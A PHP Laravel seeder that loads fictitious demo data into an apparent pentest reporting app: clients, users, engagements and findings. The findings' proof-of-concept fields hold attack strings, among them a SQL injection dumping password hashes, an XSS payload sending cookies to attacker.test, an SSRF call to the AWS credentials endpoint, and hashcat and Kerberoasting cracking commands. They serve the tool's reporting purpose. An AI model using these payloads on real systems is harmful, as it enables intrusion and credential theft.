<?php

namespace Database\Seeders;

use App\Enums\EngagementStatus;
use App\Enums\EngagementType;
use App\Enums\FindingStatus;
use App\Enums\Role;
use App\Models\ActivityLog;
use App\Models\Client;
use App\Models\Engagement;
use App\Models\FindingTemplate;
use App\Models\User;
use Illuminate\Database\Seeder;

/**
 * Public demo dataset. Every company, person and finding here is fictitious.
 */
class DatabaseSeeder extends Seeder
{
    public const DEMO_PASSWORD = 'krit0s-demo';

    public function run(): void
    {
        $this->call(FindingTemplateSeeder::class);

        $aurora = Client::create(['name' => 'Banca Aurora', 'slug' => 'banca-aurora', 'sector' => 'Banca', 'contact_name' => 'Lucía Prado', 'contact_email' => 'seguridad@aurora.test']);
        $nebula = Client::create(['name' => 'Nébula Health', 'slug' => 'nebula-health', 'sector' => 'Salud', 'contact_name' => 'Iker Salas', 'contact_email' => 'ciso@nebula.test']);
        $orbital = Client::create(['name' => 'Orbital Logistics', 'slug' => 'orbital-logistics', 'sector' => 'Logística', 'contact_name' => 'Marta Gil', 'contact_email' => 'it@orbital.test']);

        $admin = $this->user('Samuel Fuentes', 'admin@krit0s.test', Role::Admin);
        $ana = $this->user('Ana Ríos', 'ana@krit0s.test', Role::Pentester);
        $leo = $this->user('Leo Martín', 'leo@krit0s.test', Role::Pentester);
        $this->user('Lucía Prado', 'cliente@aurora.test', Role::Client, $aurora);

        $t = FindingTemplate::query()->get()->keyBy('title');

        $banking = $this->engagement($aurora, $ana, [$leo], [
            'code' => 'KRT-2026-001',
            'title' => 'Pentest de banca online y API móvil',
            'type' => EngagementType::Web,
            'status' => EngagementStatus::Delivered,
            'scope' => "https://online.aurora.test\nhttps://api.aurora.test/v2\nApp móvil Android 5.4.0 (build interna)",
            'starts_on' => '2026-09-01',
            'ends_on' => '2026-09-12',
            'executive_summary' => "Durante la auditoría se identificaron 6 vulnerabilidades, 2 de ellas de severidad crítica. La más grave permite a un atacante no autenticado extraer la base de datos de clientes mediante una inyección SQL en el buscador de oficinas.\n\nSe recomienda priorizar la corrección de F-01 y F-02 antes de la próxima ventana de despliegue y programar un retest en 30 días.",
            'published_at' => '2026-09-15 10:00:00',
        ], [
            [$t['Inyección SQL en parámetro de búsqueda'], 'https://online.aurora.test/oficinas?q=', FindingStatus::Remediated, "GET /oficinas?q=madrid'%20UNION%20SELECT%20username,password_hash,null%20FROM%20users-- HTTP/1.1\nHost: online.aurora.test\n\nHTTP/1.1 200 OK\n[...] admin | \$2y\$10\$Qe3... | "],
            [$t['Referencia directa insegura a objetos (IDOR)'], 'GET https://api.aurora.test/v2/statements/{id}', FindingStatus::Retest, "curl -H 'Authorization: Bearer <token-cliente-A>' https://api.aurora.test/v2/statements/88213\n# Devuelve el extracto del cliente B"],
            [$t['Token JWT firmado con secreto débil'], 'https://api.aurora.test/v2/auth', FindingStatus::Open, "hashcat -m 16500 jwt.txt rockyou.txt\n# secreto recuperado: aurora2019"],
            [$t['Cross-Site Scripting (XSS) reflejado'], 'https://online.aurora.test/ayuda?tema=', FindingStatus::Remediated, '<script>fetch("//attacker.test/c?"+document.cookie)</script>'],
            [$t['Ausencia de limitación de intentos en login'], 'POST https://online.aurora.test/login', FindingStatus::Open, null],
            [$t['Cabeceras de seguridad HTTP ausentes'], 'https://online.aurora.test', FindingStatus::AcceptedRisk, null],
        ]);

        $this->engagement($nebula, $ana, [], [
            'code' => 'KRT-2026-002',
            'title' => 'Auditoría cloud AWS del portal de pacientes',
            'type' => EngagementType::Cloud,
            'status' => EngagementStatus::Review,
            'scope' => "Cuenta AWS 4821-xxxx (eu-west-1)\nPortal https://pacientes.nebula.test",
            'starts_on' => '2026-10-06',
            'ends_on' => '2026-10-17',
            'executive_summary' => 'Borrador en revisión por el responsable del proyecto.',
        ], [
            [$t['Server-Side Request Forgery (SSRF) en importación por URL'], 'POST https://pacientes.nebula.test/api/import', FindingStatus::Open, 'POST /api/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'],
            [$t['Bucket de almacenamiento con listado público'], 's3://nebula-backups-prod', FindingStatus::Open, 'aws s3 ls s3://nebula-backups-prod --no-sign-request'],
            [$t['Componente con vulnerabilidad conocida'], 'https://pacientes.nebula.test (librería de PDF 2.1.3)', FindingStatus::Open, null],
        ]);

        $this->engagement($orbital, $leo, [$ana], [
            'code' => 'KRT-2026-003',
            'title' => 'Pentest interno de Active Directory',
            'type' => EngagementType::ActiveDirectory,
            'status' => EngagementStatus::InProgress,
            'scope' => "Dominio ORBITAL.LOCAL\nSegmento 10.20.0.0/16 desde puesto de usuario estándar",
            'starts_on' => '2026-10-20',
            'ends_on' => '2026-10-31',
            'executive_summary' => null,
        ], [
            [$t['Kerberoasting: cuentas de servicio con SPN y contraseña débil'], 'svc_sql, svc_backup (ORBITAL.LOCAL)', FindingStatus::Open, "GetUserSPNs.py ORBITAL.LOCAL/jlopez -request -outputfile tgs.txt\nhashcat -m 13100 tgs.txt wordlist.txt"],
        ]);

        $this->engagement($aurora, $leo, [], [
            'code' => 'KRT-2026-004',
            'title' => 'Retest banca online (Q4)',
            'type' => EngagementType::Web,
            'status' => EngagementStatus::Planning,
            'scope' => 'Verificación de las correcciones del informe KRT-2026-001.',
            'starts_on' => '2026-11-10',
            'ends_on' => '2026-11-12',
            'executive_summary' => null,
        ], []);

        foreach ([
            [$admin, 'engagement.published', "Informe publicado al cliente: {$banking->code}"],
            [$ana, 'finding.updated', 'F-02 actualizado en KRT-2026-001'],
            [$leo, 'finding.created', 'F-01 «Kerberoasting» añadido a KRT-2026-003'],
        ] as [$user, $action, $description]) {
            ActivityLog::create(['user_id' => $user->id, 'action' => $action, 'description' => $description, 'subject_type' => $banking->getMorphClass(), 'subject_id' => $banking->id]);
        }
    }

    private function user(string $name, string $email, Role $role, ?Client $client = null): User
    {
        return User::create([
            'name' => $name,
            'email' => $email,
            'password' => self::DEMO_PASSWORD,
            'role' => $role,
            'client_id' => $client?->id,
            'email_verified_at' => now(),
        ]);
    }

    /**
     * @param  array<string, mixed>  $attributes
     * @param  list<User>  $team
     * @param  list<array{0: FindingTemplate, 1: string, 2: FindingStatus, 3: ?string}>  $findings
     */
    private function engagement(Client $client, User $lead, array $team, array $attributes, array $findings): Engagement
    {
        $engagement = Engagement::create([
            ...$attributes,
            'client_id' => $client->id,
            'lead_id' => $lead->id,
            'methodology' => 'OWASP WSTG v4.2 · PTES',
        ]);
        $engagement->team()->sync(collect($team)->pluck('id'));

        foreach ($findings as [$template, $assets, $status, $poc]) {
            $engagement->findings()->create([
                'template_id' => $template->id,
                'author_id' => $lead->id,
                'title' => $template->title,
                'cvss_vector' => $template->cvss_vector,
                'status' => $status,
                'affected_assets' => $assets,
                'description' => $template->description,
                'proof_of_concept' => $poc,
                'impact' => $template->impact,
                'remediation' => $template->remediation,
                'references' => $template->references,
            ]);
        }

        return $engagement;
    }
}
